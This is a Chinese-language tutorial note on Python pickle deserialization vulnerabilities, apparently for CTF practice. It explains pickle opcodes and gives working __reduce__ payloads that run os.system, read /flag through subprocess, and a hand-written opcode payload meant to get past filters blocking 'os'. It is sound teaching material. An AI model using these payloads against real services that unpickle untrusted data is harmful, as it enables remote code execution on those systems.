---
title: python反序列化漏洞
date: 2026-11-25
---
# python反序列化漏洞
创建时间：2026-11-25
# 序列化
在程序运行时，产生的状态都存在内存中（变量、对象属性、容器内容等）。如果程序停止运行，这些数据就消失了，对于很多程序来说，重建这些状态需要付出很高的代价，可能是重新发起上千次的网络请求，或是重新跑几小时的计算，所以为了下次启动时能接着用，就需要把这些内存中的状态保存到硬盘中，这个将内存中的对象转为一段序列（文本或字节流）的过程就叫做序列化。这段序列可以直接存入硬盘，但写入硬盘也只是它的用途之一。
# 反序列化
反序列化就是序列化的相反操作，将序列重新转为内存中的对象，这个还原的过程就叫反序列化。
## 反序列化漏洞
反序列化时，程序会按序列里的内容去构造对象、调用东西。所以只要攻击者控制了序列，就能让程序按他的指定执行。
## python反序列化漏洞
**原理：**
Python 的 pickle 格式本身是一段指令，其中的 GLOBAL 可以按名字取出任意函数、REDUCE 可以调用它，攻击者把“取 os.system这类可调用系统命令的函数、传 cat /flag”直接写进序列，反序列化时就会执行。

GLOBAL：按名字把函数搬到栈上，指令c  
REDUCE：调用栈上的函数，指令R (后面的总表有写)

**模块：** pickle
**函数：** `pickle.dumps()`
**作用：** 将python对象序列化成二进制字节串（bytes）
```python
import pickle
data_0 = pickle.dumps([1,2,3,4],protocol=0)                        #b'(lp0\nI1\naI2\naI3\naI4\na.'
data_1 = pickle.dumps(['a','b','c','d'],protocol=0)                  #b'(lp0\nVa\np1\naVb\np2\naVc\np3\naVd\np4\na.'
data_2 = pickle.dumps({'name':'tom','age':'18'},protocol=0) #b'(dp0\nVname\np1\nVtom\np2\nsVage\np3\nV18\np4\ns.'
data_3 = pickle.dumps(1,protocol=0)                                  #b'I1\n.'
data_4 = pickle.dumps('a',protocol=0)                                #b'Va\np0\n.'
print(data_0,data_1,data_2,data_3,data_4)
```
**单字符指令：** `( l a d s t .` 等， 一个字符就是一条完整指令

**带参数的指令：** `I p g V S c i o` 等，参数一直读到换行为止；其中 c 和 i 要读两行（模块名一行、属性名一行），中间的全是它的参数。
文章结尾有opcode 对照表
# 魔术方法：`__reduce__`
**作用：** 在pickle序列化时自动调用
通过这个方法可以生成payload
例如（Linux环境）：
```python
import pickle, os
class RCE:
    def __reduce__(self):
        return (os.system, ('echo pwned',))
data = pickle.dumps(RCE(), protocol=0)
print(data)
# b'cposix\nsystem\np0\n(Vecho pwned\np1\ntp2\nRp3\n.'
pickle.loads(data)  # 反序列化的瞬间命令就执行了
```
注意输出里写的是 `cposix\nsystem\n` 而不是 os：Linux 上 os.system 的真实归属模块是 posix，pickle 按引用序列化时会记录真实模块名。
```text
 cposix\nsystem\n
  └模块┘   └属性┘
```
# os.system()的限制
```python
r = os.system('echo hello')
```
→ 屏幕上出现 hello，但 r 的值是 0
0 = 命令执行成功。命令的输出直接打印到终端，Python 拿不到，所以要拿到命令的输出，就不能用 os.system()。

**模块：** subprocess

**函数：** `subprocess.getoutput()`

**作用：** 执行一条外部命令，把输出当作字符串返回（str），命令执行失败时不抛异常，可能是空串，总是走shell
```python
out = subprocess.getoutput('echo hello')
```
→ out 的值是 'hello'

**函数：** `subprocess.check_output()`

**作用：** 执行一条外部命令，把它的标准输出收下来返回（bytes），命令执行失败时会抛CalledProcessError，默认不走shell，要shell=True
```python
import pickle, base64, subprocess
class RCE:
    def __reduce__(self):
        return (subprocess.check_output, (['cat', '/flag'],))
print(base64.b64encode(pickle.dumps(RCE())))
```
# 手写 opcode
因为 pickle.dumps 记录的模块名和生成环境绑定，os 只是外壳，os.system 实际属于平台模块。在Windows 上是 nt 模块，而Linux 上是 posix。有些题目会禁用os，那这时候可以用它其他的模块名进行绕过，但在使用脚本的时候，我没法指定生成os这个模块的其他模块名，所以这时候就需要手写opcode了

```python
import pickle, pickletools

payload = (b"Vos\n"          # 压入 'os'
           b"Vsystem\n"      # 压入 'system'
           b"\x93"           # STACK_GLOBAL -> os.system
           b"(S'echo pwned'\n"
           b"tR.")
pickletools.dis(payload)     # 检查每条指令是否符合预期
pickle.loads(payload)        # 本地验证
```
当然，不用脚本自己手动拼成一个字符串也可以b"Vos\nVsystem\n\x93(S'echo pwned'\ntR."

# pickle opcode 对照表（protocol 0）


## 总表

| 指令 | 全称 | 中文 | 参数 | 取走 | 放回 |
|---|---|---|---|---|---|
| `.` | STOP | 停止 | — | 栈顶 | 结束并返回它 |
| `(` | MARK | 标记 | — | — | 书签 |
| `0` | POP | 丢弃 | — | 栈顶 | — |
| `2` | DUP | 复制 | — | — | 复制一份栈顶 |
| `I` | INT | 整数 | 数字 | — | 整数 |
| `F` | FLOAT | 浮点数 | 小数 | — | 浮点数 |
| `L` | LONG | 长整数 | 数字 + `L` | — | 大整数 |
| `S` | STRING | 字符串（带引号） | `'…'` | — | 字符串 |
| `V` | UNICODE | 字符串（不带引号） | 内容 | — | 字符串 |
| `N` | NONE | 空值 | — | — | `None` |
| `)` | EMPTY_TUPLE | 空元组 | — | — | `()` |
| `]` | EMPTY_LIST | 空列表 | — | — | `[]` |
| `}` | EMPTY_DICT | 空字典 | — | — | `{}` |
| `l` | LIST | 列表 | — | 书签以上全部 | list |
| `d` | DICT | 字典 | — | 书签以上全部（成对） | dict |
| `t` | TUPLE | 元组 | — | 书签以上全部 | tuple |
| `a` | APPEND | 追加 | — | 栈顶 1 个 | 塞进下面容器 |
| `s` | SETITEM | 设置一项 | — | 栈顶 2 个 | 塞成键值对 |
| `u` | SETITEMS | 批量设置 | — | 书签以上全部 | 批量塞键值对 |
| `c` | GLOBAL | 全局对象 | 模块名、属性名 | — | 那个函数或类 |
| `R` | REDUCE | 调用 | — | 元组 + 函数 | 调用结果 |
| `i` | INST | 实例化 | 模块名、属性名 | 书签以上（参数） | 调用结果 |
| `o` | OBJ | 调用栈上对象 | — | 书签以上（首项是函数） | 调用结果 |
| `b` | BUILD | 设置状态 | — | 状态 | 对象（已更新） |
| `p` | PUT | 存入备忘录 | 编号 | — | —（只记账） |
| `g` | GET | 从备忘录取出 | 编号 | — | 那个对象 |


资料来源：https://hello-ctf.com/hc-web/py_unser/
